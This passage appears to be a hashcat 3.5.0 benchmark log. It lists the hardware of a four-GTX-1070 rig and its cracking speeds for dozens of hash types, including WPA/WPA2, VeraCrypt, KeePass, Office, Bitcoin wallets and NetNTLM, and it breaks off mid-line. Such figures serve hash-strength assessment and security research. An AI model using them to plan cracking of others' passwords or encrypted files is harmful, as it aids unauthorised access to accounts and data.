Password/PIN\n\nSpeed.Dev.#1.....:  7741.8 kH/s (58.51ms)\nSpeed.Dev.#2.....:  7680.9 kH/s (58.96ms)\nSpeed.Dev.#3.....:  7556.6 kH/s (59.93ms)\nSpeed.Dev.#4.....:  7584.9 kH/s (59.72ms)\nSpeed.Dev.#*.....: 30564.3 kH/s\n\nHashtype: Citrix NetScaler\n\nSpeed.Dev.#1.....: 10409.2 MH/s (90.23ms)\nSpeed.Dev.#2.....: 10342.3 MH/s (90.79ms)\nSpeed.Dev.#3.....: 10163.4 MH/s (92.40ms)\nSpeed.Dev.#4.....: 10174.5 MH/s (92.31ms)\nSpeed.Dev.#*.....: 41089.4 MH/s\n\nHashtype: RACF\n\nSpeed.Dev.#1.....:  3549.7 MH/s (66.14ms)\nSpeed.Dev.#2.....:  3553.3 MH/s (66.07ms)\nSpeed.Dev.#3.....:  3468.1 MH/s (67.68ms)\nSpeed.Dev.#4.....:  3504.5 MH/s (66.97ms)\nSpeed.Dev.#*.....: 14075.5 MH/s\n\nHashtype: GRUB 2\n\nSpeed.Dev.#1.....:    61341 H/s (95.47ms)\nSpeed.Dev.#2.....:    60492 H/s (96.81ms)\nSpeed.Dev.#3.....:    53858 H/s (54.44ms)\nSpeed.Dev.#4.....:    56225 H/s (52.14ms)\nSpeed.Dev.#*.....:   231.9 kH/s\n\nHashtype: Radmin2\n\nSpeed.Dev.#1.....: 11155.5 MH/s (84.19ms)\nSpeed.Dev.#2.....: 11153.1 MH/s (84.19ms)\nSpeed.Dev.#3.....: 10973.6 MH/s (85.59ms)\nSpeed.Dev.#4.....:  9496.8 MH/s (98.90ms)\nSpeed.Dev.#*.....: 42778.9 MH/s\n\nHashtype: SAP CODVN B (BCODE)\n\nSpeed.Dev.#1.....:  2513.3 MH/s (46.70ms)\nSpeed.Dev.#2.....:  2485.7 MH/s (47.18ms)\nSpeed.Dev.#3.....:  2472.0 MH/s (47.45ms)\nSpeed.Dev.#4.....:  2478.4 MH/s (47.32ms)\nSpeed.Dev.#*.....:  9949.4 MH/s\n\nHashtype: SAP CODVN F/G (PASSCODE)\n\nSpeed.Dev.#1.....:  1329.2 MH/s (88.32ms)\nSpeed.Dev.#2.....:  1325.2 MH/s (88.58ms)\nSpeed.Dev.#3.....:  1269.8 MH/s (92.44ms)\nSpeed.Dev.#4.....:  1255.6 MH/s (93.49ms)\nSpeed.Dev.#*.....:  5180.0 MH/s\n\nHashtype: SAP CODVN H (PWDSALTEDHASH) iSSHA-1\n\nSpeed.Dev.#1.....:  8628.7 kH/s (52.36ms)\nSpeed.Dev.#2.....:  8523.9 kH/s (52.96ms)\nSpeed.Dev.#3.....:  7976.6 kH/s (56.64ms)\nSpeed.Dev.#4.....:  7796.2 kH/s (58.00ms)\nSpeed.Dev.#*.....: 32925.4 kH/s\n\nHashtype: Lotus Notes/Domino 5\n\nSpeed.Dev.#1.....:   298.8 MH/s (98.21ms)\nSpeed.Dev.#2.....:   298.9 MH/s (98.17ms)\nSpeed.Dev.#3.....:   268.3 MH/s (109.39ms)\nSpeed.Dev.#4.....:   291.4 MH/s (100.71ms)\nSpeed.Dev.#*.....:  1157.5 MH/s\n\nHashtype: Lotus Notes/Domino 6\n\nSpeed.Dev.#1.....:   100.3 MH/s (73.16ms)\nSpeed.Dev.#2.....:   100.2 MH/s (73.20ms)\nSpeed.Dev.#3.....: 96971.1 kH/s (75.67ms)\nSpeed.Dev.#4.....: 99021.0 kH/s (74.10ms)\nSpeed.Dev.#*.....:   396.5 MH/s\n\nHashtype: Lotus Notes/Domino 8\n\nSpeed.Dev.#1.....:   947.3 kH/s (47.94ms)\nSpeed.Dev.#2.....:   933.5 kH/s (48.66ms)\nSpeed.Dev.#3.....:   915.6 kH/s (49.61ms)\nSpeed.Dev.#4.....:   900.6 kH/s (50.44ms)\nSpeed.Dev.#*.....:  3697.1 kH/s\n\nHashtype: PeopleSoft\n\nSpeed.Dev.#1.....: 11636.7 MH/s (80.68ms)\nSpeed.Dev.#2.....: 11618.0 MH/s (80.84ms)\nSpeed.Dev.#3.....: 10957.6 MH/s (85.71ms)\nSpeed.Dev.#4.....: 10721.1 MH/s (87.61ms)\nSpeed.Dev.#*.....: 44933.4 MH/s\n\nHashtype: PeopleSoft PS_TOKEN\n\nSpeed.Dev.#1.....:  4515.0 MH/s (51.79ms)\nSpeed.Dev.#2.....:  4527.4 MH/s (51.65ms)\nSpeed.Dev.#3.....:  4392.2 MH/s (53.22ms)\nSpeed.Dev.#4.....:  4471.0 MH/s (52.30ms)\nSpeed.Dev.#*.....: 17905.6 MH/s\n\nHashtype: 7-Zip\n\nSpeed.Dev.#1.....:    12789 H/s (69.83ms)\nSpeed.Dev.#2.....:    12800 H/s (69.77ms)\nSpeed.Dev.#3.....:    11590 H/s (77.05ms)\nSpeed.Dev.#4.....:    11676 H/s (76.49ms)\nSpeed.Dev.#*.....:    48855 H/s\n\nHashtype: WinZip\n\nSpeed.Dev.#1.....:  1524.0 kH/s (64.38ms)\nSpeed.Dev.#2.....:  1505.3 kH/s (65.21ms)\nSpeed.Dev.#3.....:  1449.9 kH/s (67.76ms)\nSpeed.Dev.#4.....:  1483.8 kH/s (66.17ms)\nSpeed.Dev.#*.....:  5963.0 kH/s\n\nHashtype: RAR3-hp\n\nSpeed.Dev.#1.....:    41530 H/s (43.08ms)\nSpeed.Dev.#2.....:    41576 H/s (43.04ms)\nSpeed.Dev.#3.....:    41219 H/s (43.41ms)\nSpeed.Dev.#4.....:    41404 H/s (43.22ms)\nSpeed.Dev.#*.....:   165.7 kH/s\n\nHashtype: RAR5\n\nSpeed.Dev.#1.....:    51436 H/s (69.48ms)\nSpeed.Dev.#2.....:    50720 H/s (70.46ms)\nSpeed.Dev.#3.....:    44664 H/s (80.02ms)\nSpeed.Dev.#4.....:    45944 H/s (77.79ms)\nSpeed.Dev.#*.....:   192.8 kH/s\n\nHashtype: AxCrypt\n\nSpeed.Dev.#1.....:   161.8 kH/s (144.49ms)\nSpeed.Dev.#2.....:   161.4 kH/s (144.78ms)\nSpeed.Dev.#3.....:   142.6 kH/s (163.92ms)\nSpeed.Dev.#4.....:   137.4 kH/s (170.07ms)\nSpeed.Dev.#*.....:   603.2 kH/s\n\nHashtype: AxCrypt in-memory SHA1\n\nSpeed.Dev.#1.....: 10695.4 MH/s (87.80ms)\nSpeed.Dev.#2.....: 10759.7 MH/s (87.29ms)\nSpeed.Dev.#3.....: 10311.3 MH/s (91.08ms)\nSpeed.Dev.#4.....: 10547.0 MH/s (89.05ms)\nSpeed.Dev.#*.....: 42313.3 MH/s\n\nHashtype: TrueCrypt PBKDF2-HMAC-RIPEMD160 + XTS 512 bit\n\nSpeed.Dev.#1.....:   389.0 kH/s (69.67ms)\nSpeed.Dev.#2.....:   385.7 kH/s (70.28ms)\nSpeed.Dev.#3.....:   361.3 kH/s (75.02ms)\nSpeed.Dev.#4.....:   378.7 kH/s (71.55ms)\nSpeed.Dev.#*.....:  1514.8 kH/s\n\nHashtype: TrueCrypt PBKDF2-HMAC-SHA512 + XTS 512 bit\n\nSpeed.Dev.#1.....:   575.2 kH/s (84.40ms)\nSpeed.Dev.#2.....:   578.8 kH/s (83.88ms)\nSpeed.Dev.#3.....:   516.8 kH/s (94.00ms)\nSpeed.Dev.#4.....:   558.5 kH/s (86.86ms)\nSpeed.Dev.#*.....:  2229.3 kH/s\n\nHashtype: TrueCrypt PBKDF2-HMAC-Whirlpool + XTS 512 bit\n\nSpeed.Dev.#1.....:    51677 H/s (273.98ms)\nSpeed.Dev.#2.....:    51919 H/s (272.70ms)\nSpeed.Dev.#3.....:    49017 H/s (144.80ms)\nSpeed.Dev.#4.....:    48341 H/s (146.78ms)\nSpeed.Dev.#*.....:   201.0 kH/s\n\nHashtype: TrueCrypt PBKDF2-HMAC-RIPEMD160 + XTS 512 bit + boot-mode\n\nSpeed.Dev.#1.....:   737.1 kH/s (63.97ms)\nSpeed.Dev.#2.....:   718.6 kH/s (64.48ms)\nSpeed.Dev.#3.....:   692.4 kH/s (68.03ms)\nSpeed.Dev.#4.....:   713.5 kH/s (66.03ms)\nSpeed.Dev.#*.....:  2861.7 kH/s\n\nHashtype: VeraCrypt PBKDF2-HMAC-RIPEMD160 + XTS 512 bit\n\nSpeed.Dev.#1.....:     1231 H/s (71.51ms)\nSpeed.Dev.#2.....:     1177 H/s (74.95ms)\nSpeed.Dev.#3.....:      985 H/s (88.25ms)\nSpeed.Dev.#4.....:     1062 H/s (83.43ms)\nSpeed.Dev.#*.....:     4455 H/s\n\nHashtype: VeraCrypt PBKDF2-HMAC-SHA512 + XTS 512 bit\n\nSpeed.Dev.#1.....:     1225 H/s (94.86ms)\nSpeed.Dev.#2.....:     1077 H/s (106.48ms)\nSpeed.Dev.#3.....:      993 H/s (58.86ms)\nSpeed.Dev.#4.....:      997 H/s (58.62ms)\nSpeed.Dev.#*.....:     4292 H/s\n\nHashtype: VeraCrypt PBKDF2-HMAC-Whirlpool + XTS 512 bit\n\nSpeed.Dev.#1.....:       93 H/s (142.83ms)\nSpeed.Dev.#2.....:       92 H/s (149.01ms)\nSpeed.Dev.#3.....:       62 H/s (165.36ms)\nSpeed.Dev.#4.....:       62 H/s (164.67ms)\nSpeed.Dev.#*.....:      308 H/s\n\nHashtype: VeraCrypt PBKDF2-HMAC-RIPEMD160 + XTS 512 bit + boot-mode\n\nSpeed.Dev.#1.....:     2464 H/s (71.81ms)\nSpeed.Dev.#2.....:     2327 H/s (76.19ms)\nSpeed.Dev.#3.....:     2092 H/s (84.68ms)\nSpeed.Dev.#4.....:     1997 H/s (88.40ms)\nSpeed.Dev.#*.....:     8880 H/s\n\nHashtype: VeraCrypt PBKDF2-HMAC-SHA256 + XTS 512 bit\n\nSpeed.Dev.#1.....:     1604 H/s (72.66ms)\nSpeed.Dev.#2.....:     1570 H/s (74.16ms)\nSpeed.Dev.#3.....:     1438 H/s (80.33ms)\nSpeed.Dev.#4.....:     1469 H/s (78.79ms)\nSpeed.Dev.#*.....:     6081 H/s\n\nHashtype: VeraCrypt PBKDF2-HMAC-SHA256 + XTS 512 bit + boot-mode\n\nSpeed.Dev.#1.....:     4011 H/s (72.68ms)\nSpeed.Dev.#2.....:     3750 H/s (77.82ms)\nSpeed.Dev.#3.....:     3405 H/s (85.24ms)\nSpeed.Dev.#4.....:     3560 H/s (81.67ms)\nSpeed.Dev.#*.....:    14725 H/s\n\nHashtype: Android FDE <= 4.3\n\nSpeed.Dev.#1.....:  1156.5 kH/s (48.93ms)\nSpeed.Dev.#2.....:  1146.1 kH/s (49.38ms)\nSpeed.Dev.#3.....:  1122.8 kH/s (50.41ms)\nSpeed.Dev.#4.....:  1043.4 kH/s (54.28ms)\nSpeed.Dev.#*.....:  4468.8 kH/s\n\nHashtype: Android FDE (Samsung DEK)\n\nSpeed.Dev.#1.....:   407.9 kH/s (69.91ms)\nSpeed.Dev.#2.....:   406.6 kH/s (70.13ms)\nSpeed.Dev.#3.....:   345.6 kH/s (82.57ms)\nSpeed.Dev.#4.....:   332.8 kH/s (85.76ms)\nSpeed.Dev.#*.....:  1492.9 kH/s\n\nHashtype: eCryptfs\n\nSpeed.Dev.#1.....:    18783 H/s (95.33ms)\nSpeed.Dev.#2.....:    16878 H/s (106.10ms)\nSpeed.Dev.#3.....:    16525 H/s (54.07ms)\nSpeed.Dev.#4.....:    15993 H/s (111.96ms)\nSpeed.Dev.#*.....:    68179 H/s\n\nHashtype: MS Office <= 2003 $0/$1, MD5 + RC4\n\nSpeed.Dev.#1.....:   316.7 MH/s (92.67ms)\nSpeed.Dev.#2.....:   318.3 MH/s (92.21ms)\nSpeed.Dev.#3.....:   299.4 MH/s (98.04ms)\nSpeed.Dev.#4.....:   312.3 MH/s (93.97ms)\nSpeed.Dev.#*.....:  1246.8 MH/s\n\nHashtype: MS Office <= 2003 $0/$1, MD5 + RC4, collider #1\n\nSpeed.Dev.#1.....:   449.4 MH/s (65.30ms)\nSpeed.Dev.#2.....:   452.1 MH/s (64.91ms)\nSpeed.Dev.#3.....:   440.0 MH/s (66.70ms)\nSpeed.Dev.#4.....:   446.3 MH/s (65.75ms)\nSpeed.Dev.#*.....:  1787.9 MH/s\n\nHashtype: MS Office <= 2003 $3/$4, SHA1 + RC4\n\nSpeed.Dev.#1.....:   413.4 MH/s (70.99ms)\nSpeed.Dev.#2.....:   413.4 MH/s (70.97ms)\nSpeed.Dev.#3.....:   403.3 MH/s (72.77ms)\nSpeed.Dev.#4.....:   408.1 MH/s (71.91ms)\nSpeed.Dev.#*.....:  1638.3 MH/s\n\nHashtype: MS Office <= 2003 $3/$4, SHA1 + RC4, collider #1\n\nSpeed.Dev.#1.....:   468.8 MH/s (62.58ms)\nSpeed.Dev.#2.....:   467.9 MH/s (62.68ms)\nSpeed.Dev.#3.....:   455.9 MH/s (64.33ms)\nSpeed.Dev.#4.....:   462.3 MH/s (63.49ms)\nSpeed.Dev.#*.....:  1854.9 MH/s\n\nHashtype: MS Office 2007\n\nSpeed.Dev.#1.....:   188.7 kH/s (49.74ms)\nSpeed.Dev.#2.....:   186.0 kH/s (50.44ms)\nSpeed.Dev.#3.....:   174.3 kH/s (53.85ms)\nSpeed.Dev.#4.....:   177.0 kH/s (53.02ms)\nSpeed.Dev.#*.....:   725.9 kH/s\n\nHashtype: MS Office 2010\n\nSpeed.Dev.#1.....:    93839 H/s (49.99ms)\nSpeed.Dev.#2.....:    89562 H/s (52.34ms)\nSpeed.Dev.#3.....:    82041 H/s (57.19ms)\nSpeed.Dev.#4.....:    81473 H/s (57.58ms)\nSpeed.Dev.#*.....:   346.9 kH/s\n\nHashtype: MS Office 2013\n\nSpeed.Dev.#1.....:    12317 H/s (95.10ms)\nSpeed.Dev.#2.....:    11802 H/s (99.34ms)\nSpeed.Dev.#3.....:    11011 H/s (53.16ms)\nSpeed.Dev.#4.....:    11354 H/s (103.06ms)\nSpeed.Dev.#*.....:    46483 H/s\n\nHashtype: PDF 1.1 - 1.3 (Acrobat 2 - 4)\n\nSpeed.Dev.#1.....:   464.3 MH/s (63.21ms)\nSpeed.Dev.#2.....:   466.9 MH/s (62.86ms)\nSpeed.Dev.#3.....:   453.8 MH/s (64.65ms)\nSpeed.Dev.#4.....:   460.3 MH/s (63.75ms)\nSpeed.Dev.#*.....:  1845.3 MH/s\n\nHashtype: PDF 1.1 - 1.3 (Acrobat 2 - 4), collider #1\n\nSpeed.Dev.#1.....:   521.7 MH/s (56.25ms)\nSpeed.Dev.#2.....:   521.5 MH/s (56.27ms)\nSpeed.Dev.#3.....:   507.7 MH/s (57.80ms)\nSpeed.Dev.#4.....:   514.8 MH/s (57.00ms)\nSpeed.Dev.#*.....:  2065.8 MH/s\n\nHashtype: PDF 1.4 - 1.6 (Acrobat 5 - 8)\n\nSpeed.Dev.#1.....: 22496.1 kH/s (38.20ms)\nSpeed.Dev.#2.....: 22924.7 kH/s (38.21ms)\nSpeed.Dev.#3.....: 22350.3 kH/s (39.22ms)\nSpeed.Dev.#4.....: 22577.5 kH/s (38.73ms)\nSpeed.Dev.#*.....: 90348.7 kH/s\n\nHashtype: PDF 1.7 Level 3 (Acrobat 9)\n\nSpeed.Dev.#1.....:  4355.4 MH/s (53.69ms)\nSpeed.Dev.#2.....:  4348.8 MH/s (53.73ms)\nSpeed.Dev.#3.....:  4254.7 MH/s (54.92ms)\nSpeed.Dev.#4.....:  4319.3 MH/s (54.14ms)\nSpeed.Dev.#*.....: 17278.3 MH/s\n\nHashtype: PDF 1.7 Level 8 (Acrobat 10 - 11)\n\nSpeed.Dev.#1.....:    42594 H/s (280.39ms)\nSpeed.Dev.#2.....:    43138 H/s (276.86ms)\nSpeed.Dev.#3.....:    41731 H/s (286.21ms)\nSpeed.Dev.#4.....:    42218 H/s (282.90ms)\nSpeed.Dev.#*.....:   169.7 kH/s\n\nHashtype: Password Safe v2\n\nSpeed.Dev.#1.....:   418.5 kH/s (43.72ms)\nSpeed.Dev.#2.....:   429.7 kH/s (42.78ms)\nSpeed.Dev.#3.....:   422.9 kH/s (43.43ms)\nSpeed.Dev.#4.....:   417.1 kH/s (43.82ms)\nSpeed.Dev.#*.....:  1688.2 kH/s\n\nHashtype: Password Safe v3\n\nSpeed.Dev.#1.....:  1720.7 kH/s (60.38ms)\nSpeed.Dev.#2.....:  1721.9 kH/s (60.33ms)\nSpeed.Dev.#3.....:  1671.3 kH/s (62.17ms)\nSpeed.Dev.#4.....:  1692.4 kH/s (61.38ms)\nSpeed.Dev.#*.....:  6806.2 kH/s\n\nHashtype: LastPass + LastPass sniffed\n\nSpeed.Dev.#1.....:  3309.0 kH/s (50.93ms)\nSpeed.Dev.#2.....:  3302.2 kH/s (51.06ms)\nSpeed.Dev.#3.....:  3209.3 kH/s (52.52ms)\nSpeed.Dev.#4.....:  3252.3 kH/s (51.82ms)\nSpeed.Dev.#*.....: 13072.9 kH/s\n\nHashtype: 1Password, agilekeychain\n\nSpeed.Dev.#1.....:  4718.9 kH/s (71.69ms)\nSpeed.Dev.#2.....:  4632.6 kH/s (73.03ms)\nSpeed.Dev.#3.....:  4447.9 kH/s (50.70ms)\nSpeed.Dev.#4.....:  4569.2 kH/s (74.03ms)\nSpeed.Dev.#*.....: 18368.5 kH/s\n\nHashtype: 1Password, cloudkeychain\n\nSpeed.Dev.#1.....:    15401 H/s (95.07ms)\nSpeed.Dev.#2.....:    15401 H/s (95.07ms)\nSpeed.Dev.#3.....:    14350 H/s (51.03ms)\nSpeed.Dev.#4.....:    13424 H/s (109.01ms)\nSpeed.Dev.#*.....:    58576 H/s\n\nHashtype: Bitcoin/Litecoin wallet.dat\n\nSpeed.Dev.#1.....:     6157 H/s (94.88ms)\nSpeed.Dev.#2.....:     5875 H/s (99.83ms)\nSpeed.Dev.#3.....:     5298 H/s (55.03ms)\nSpeed.Dev.#4.....:     4988 H/s (58.61ms)\nSpeed.Dev.#*.....:    22318 H/s\n\nHashtype: Blockchain, My Wallet\n\nSpeed.Dev.#1.....: 69811.3 kH/s (18.88ms)\nSpeed.Dev.#2.....: 70970.3 kH/s (18.13ms)\nSpeed.Dev.#3.....: 68251.4 kH/s (19.73ms)\nSpeed.Dev.#4.....: 69527.6 kH/s (18.98ms)\nSpeed.Dev.#*.....:   278.6 MH/s\n\nHashtype: KeePass 1 (AES/Twofish) and KeePass 2 (AES)\n\nSpeed.Dev.#1.....:   192.5 kH/s (202.42ms)\nSpeed.Dev.#2.....:   192.4 kH/s (202.53ms)\nSpeed.Dev.#3.....:   182.3 kH/s (213.68ms)\nSpeed.Dev.#4.....:   184.5 kH/s (211.22ms)\nSpeed.Dev.#*.....:   751.7 kH/s\n\nHashtype: ArubaOS\n\nSpeed.Dev.#1.....:  9568.4 MH/s (49.04ms)\nSpeed.Dev.#2.....:  9571.9 MH/s (49.05ms)\nSpeed.Dev.#3.....:  9289.2 MH/s (50.53ms)\nSpeed.Dev.#4.....:  9473.5 MH/s (49.56ms)\nSpeed.Dev.#*.....: 37903.0 MH/s\n\nStarted: Fri May 19 14:31:36 2017\n\n_________\n\nSystem 2: 4x Nvidia GTX 1070\n\nMB: EVGA Z97 P/N 142-HR-E977-KR \n\nCPU: Intel i5-4460 Haswell  @ 3.20GHz \n\nCPU-Cool: heatsink+cpu fan\n\nRAM: G.Skill Sniper 16GB (2x8) DDR3 1600 \n\nPSU: EVGA Supernova 1600 G2 \n\nHDD: SSD 1TB\nOS: Ubuntu 16.04\nCASE:\nPackages:Hashcat 3.5.0\nGPU: 4x EVGA GeForce GTX 1070 FE\n\nhashcat (v3.5.0) starting in benchmark mode...\n\nOpenCL Platform #1: NVIDIA Corporation\n======================================\n* Device #1: GeForce GTX 1070, 2028/8112 MB allocatable, 15MCU\n* Device #2: GeForce GTX 1070, 2028/8114 MB allocatable, 15MCU\n* Device #3: GeForce GTX 1070, 2028/8114 MB allocatable, 15MCU\n* Device #4: GeForce GTX 1070, 2028/8114 MB allocatable, 15MCU\n\nHashtype: MD4\n\nSpeed.Dev.#1.....: 33622.2 MH/s (59.85ms)\nSpeed.Dev.#2.....: 32953.6 MH/s (61.07ms)\nSpeed.Dev.#3.....: 33108.6 MH/s (60.78ms)\nSpeed.Dev.#4.....: 34089.1 MH/s (59.02ms)\nSpeed.Dev.#*.....:   133.8 GH/s\n\nHashtype: MD5\n\nSpeed.Dev.#1.....: 18534.9 MH/s (54.28ms)\nSpeed.Dev.#2.....: 17880.8 MH/s (55.68ms)\nSpeed.Dev.#3.....: 18188.7 MH/s (55.32ms)\nSpeed.Dev.#4.....: 18401.1 MH/s (54.66ms)\nSpeed.Dev.#*.....: 73005.5 MH/s\n\nHashtype: Half MD5\n\nSpeed.Dev.#1.....: 11493.6 MH/s (87.56ms)\nSpeed.Dev.#2.....: 11296.1 MH/s (89.08ms)\nSpeed.Dev.#3.....: 11253.8 MH/s (89.42ms)\nSpeed.Dev.#4.....: 11526.1 MH/s (87.30ms)\nSpeed.Dev.#*.....: 45569.7 MH/s\n\nHashtype: SHA1\n\nSpeed.Dev.#1.....:  6083.1 MH/s (82.71ms)\nSpeed.Dev.#2.....:  5937.4 MH/s (84.74ms)\nSpeed.Dev.#3.....:  5951.8 MH/s (84.54ms)\nSpeed.Dev.#4.....:  6063.9 MH/s (82.96ms)\nSpeed.Dev.#*.....: 24036.2 MH/s\n\nHashtype: SHA-256\n\nSpeed.Dev.#1.....:  2384.7 MH/s (52.53ms)\nSpeed.Dev.#2.....:  2342.7 MH/s (53.48ms)\nSpeed.Dev.#3.....:  2321.3 MH/s (53.97ms)\nSpeed.Dev.#4.....:  2363.2 MH/s (53.01ms)\nSpeed.Dev.#*.....:  9411.8 MH/s\n\nHashtype: SHA-384\n\nSpeed.Dev.#1.....:   782.2 MH/s (80.40ms)\nSpeed.Dev.#2.....:   772.1 MH/s (81.46ms)\nSpeed.Dev.#3.....:   768.9 MH/s (81.81ms)\nSpeed.Dev.#4.....:   785.4 MH/s (80.07ms)\nSpeed.Dev.#*.....:  3108.6 MH/s\n\nHashtype: SHA-512\n\nSpeed.Dev.#1.....:   804.9 MH/s (78.12ms)\nSpeed.Dev.#2.....:   789.9 MH/s (79.62ms)\nSpeed.Dev.#3.....:   791.3 MH/s (79.48ms)\nSpeed.Dev.#4.....:   803.2 MH/s (78.29ms)\nSpeed.Dev.#*.....:  3189.4 MH/s\n\nHashtype: SHA-3 (Keccak)\n\nSpeed.Dev.#1.....:   640.9 MH/s (49.01ms)\nSpeed.Dev.#2.....:   617.6 MH/s (50.86ms)\nSpeed.Dev.#3.....:   608.5 MH/s (51.62ms)\nSpeed.Dev.#4.....:   640.4 MH/s (49.04ms)\nSpeed.Dev.#*.....:  2507.4 MH/s\n\nHashtype: SipHash\n\nSpeed.Dev.#1.....: 21491.3 MH/s (93.64ms)\nSpeed.Dev.#2.....: 21022.1 MH/s (95.75ms)\nSpeed.Dev.#3.....: 21012.9 MH/s (95.79ms)\nSpeed.Dev.#4.....: 21595.3 MH/s (93.19ms)\nSpeed.Dev.#*.....: 85121.6 MH/s\n\nHashtype: Skip32 (PT = $salt, key = $pass)\n\nSpeed.Dev.#1.....:  3975.6 MH/s (2.08ms)\nSpeed.Dev.#2.....:  3932.8 MH/s (2.11ms)\nSpeed.Dev.#3.....:  3896.2 MH/s (2.13ms)\nSpeed.Dev.#4.....:  3921.7 MH/s (2.10ms)\nSpeed.Dev.#*.....: 15726.4 MH/s\n\nHashtype: RIPEMD-160\n\nSpeed.Dev.#1.....:  3599.3 MH/s (69.89ms)\nSpeed.Dev.#2.....:  3543.3 MH/s (71.00ms)\nSpeed.Dev.#3.....:  3532.3 MH/s (71.22ms)\nSpeed.Dev.#4.....:  3600.0 MH/s (69.87ms)\nSpeed.Dev.#*.....: 14274.9 MH/s\n\nHashtype: Whirlpool\n\nSpeed.Dev.#1.....:   193.2 MH/s (162.60ms)\nSpeed.Dev.#2.....:   189.9 MH/s (165.42ms)\nSpeed.Dev.#3.....:   188.9 MH/s (166.37ms)\nSpeed.Dev.#4.....:   192.0 MH/s (163.68ms)\nSpeed.Dev.#*.....:   764.0 MH/s\n\nHashtype: GOST R 34.11-94\n\nSpeed.Dev.#1.....:   183.0 MH/s (85.91ms)\nSpeed.Dev.#2.....:   180.0 MH/s (87.35ms)\nSpeed.Dev.#3.....:   179.0 MH/s (87.84ms)\nSpeed.Dev.#4.....:   181.9 MH/s (86.42ms)\nSpeed.Dev.#*.....:   724.0 MH/s\n\nHashtype: GOST R 34.11-2012 (Streebog) 256-bit\n\nSpeed.Dev.#1.....: 38135.8 kH/s (203.77ms)\nSpeed.Dev.#2.....: 37434.5 kH/s (207.59ms)\nSpeed.Dev.#3.....: 37186.8 kH/s (208.97ms)\nSpeed.Dev.#4.....: 37909.3 kH/s (204.98ms)\nSpeed.Dev.#*.....:   150.7 MH/s\n\nHashtype: GOST R 34.11-2012 (Streebog) 512-bit\n\nSpeed.Dev.#1.....: 38165.2 kH/s (203.61ms)\nSpeed.Dev.#2.....: 37194.3 kH/s (208.93ms)\nSpeed.Dev.#3.....: 37207.1 kH/s (208.85ms)\nSpeed.Dev.#4.....: 37942.2 kH/s (204.80ms)\nSpeed.Dev.#*.....:   150.5 MH/s\n\nHashtype: DES (PT = $salt, key = $pass)\n\nSpeed.Dev.#1.....: 13952.7 MH/s (72.08ms)\nSpeed.Dev.#2.....: 13630.0 MH/s (73.79ms)\nSpeed.Dev.#3.....: 13802.0 MH/s (72.88ms)\nSpeed.Dev.#4.....: 13997.0 MH/s (71.82ms)\nSpeed.Dev.#*.....: 55381.7 MH/s\n\nHashtype: 3DES (PT = $salt, key = $pass)\n\nSpeed.Dev.#1.....:   438.6 MH/s (71.69ms)\nSpeed.Dev.#2.....:   431.4 MH/s (72.90ms)\nSpeed.Dev.#3.....:   428.8 MH/s (73.32ms)\nSpeed.Dev.#4.....:   439.8 MH/s (71.50ms)\nSpeed.Dev.#*.....:  1738.6 MH/s\n\nHashtype: phpass, WordPress (MD5), phpBB3 (MD5), Joomla (MD5)\n\nSpeed.Dev.#1.....:  5097.9 kH/s (95.36ms)\nSpeed.Dev.#2.....:  4580.3 kH/s (103.60ms)\nSpeed.Dev.#3.....:  4474.6 kH/s (102.77ms)\nSpeed.Dev.#4.....:  5033.0 kH/s (94.81ms)\nSpeed.Dev.#*.....: 19185.8 kH/s\n\nHashtype: scrypt\n\nSpeed.Dev.#1.....:   521.3 kH/s (14.52ms)\nSpeed.Dev.#2.....:   529.4 kH/s (14.29ms)\nSpeed.Dev.#3.....:   504.8 kH/s (15.00ms)\nSpeed.Dev.#4.....:   542.7 kH/s (13.90ms)\nSpeed.Dev.#*.....:  2098.2 kH/s\n\nHashtype: PBKDF2-HMAC-MD5\n\nSpeed.Dev.#1.....:  5535.4 kH/s (58.04ms)\nSpeed.Dev.#2.....:  5450.0 kH/s (58.95ms)\nSpeed.Dev.#3.....:  5471.2 kH/s (58.70ms)\nSpeed.Dev.#4.....:  5581.5 kH/s (57.52ms)\nSpeed.Dev.#*.....: 22038.1 kH/s\n\nHashtype: PBKDF2-HMAC-SHA1\n\nSpeed.Dev.#1.....:  2425.5 kH/s (83.63ms)\nSpeed.Dev.#2.....:  2371.6 kH/s (42.74ms)\nSpeed.Dev.#3.....:  2375.9 kH/s (42.67ms)\nSpeed.Dev.#4.....:  2430.8 kH/s (83.43ms)\nSpeed.Dev.#*.....:  9603.8 kH/s\n\nHashtype: PBKDF2-HMAC-SHA256\n\nSpeed.Dev.#1.....:   876.8 kH/s (59.78ms)\nSpeed.Dev.#2.....:   870.7 kH/s (61.16ms)\nSpeed.Dev.#3.....:   874.5 kH/s (60.89ms)\nSpeed.Dev.#4.....:   895.2 kH/s (59.46ms)\nSpeed.Dev.#*.....:  3517.1 kH/s\n\nHashtype: PBKDF2-HMAC-SHA512\n\nSpeed.Dev.#1.....:   323.9 kH/s (86.34ms)\nSpeed.Dev.#2.....:   318.5 kH/s (88.05ms)\nSpeed.Dev.#3.....:   319.2 kH/s (87.86ms)\nSpeed.Dev.#4.....:   326.4 kH/s (85.90ms)\nSpeed.Dev.#*.....:  1288.1 kH/s\n\nHashtype: Skype\n\nSpeed.Dev.#1.....:  9426.6 MH/s (52.01ms)\nSpeed.Dev.#2.....:  9370.8 MH/s (53.68ms)\nSpeed.Dev.#3.....:  9440.8 MH/s (53.29ms)\nSpeed.Dev.#4.....:  9695.0 MH/s (51.87ms)\nSpeed.Dev.#*.....: 37933.3 MH/s\n\nHashtype: WPA/WPA2\n\nSpeed.Dev.#1.....:   296.5 kH/s (51.65ms)\nSpeed.Dev.#2.....:   290.1 kH/s (52.79ms)\nSpeed.Dev.#3.....:   290.4 kH/s (52.70ms)\nSpeed.Dev.#4.....:   298.0 kH/s (51.39ms)\nSpeed.Dev.#*.....:  1175.1 kH/s\n\nHashtype: IKE-PSK MD5\n\nSpeed.Dev.#1.....:  1249.5 MH/s (100.68ms)\nSpeed.Dev.#2.....:  1278.4 MH/s (49.19ms)\nSpeed.Dev.#3.....:  1274.4 MH/s (49.35ms)\nSpeed.Dev.#4.....:  1317.4 MH/s (95.11ms)\nSpeed.Dev.#*.....:  5119.6 MH/s\n\nHashtype: IKE-PSK SHA1\n\nSpeed.Dev.#1.....:   587.0 MH/s (53.51ms)\nSpeed.Dev.#2.....:   573.7 MH/s (54.76ms)\nSpeed.Dev.#3.....:   572.9 MH/s (54.82ms)\nSpeed.Dev.#4.....:   590.4 MH/s (53.18ms)\nSpeed.Dev.#*.....:  2323.9 MH/s\n\nHashtype: NetNTLMv1 / NetNTLMv1+ESS\n\nSpeed.Dev.#1.....: 16282.0 MH/s (61.80ms)\nSpeed.Dev.#2.....: 15909.9 MH/s (63.25ms)\nSpeed.Dev.#3.....: 15507.2 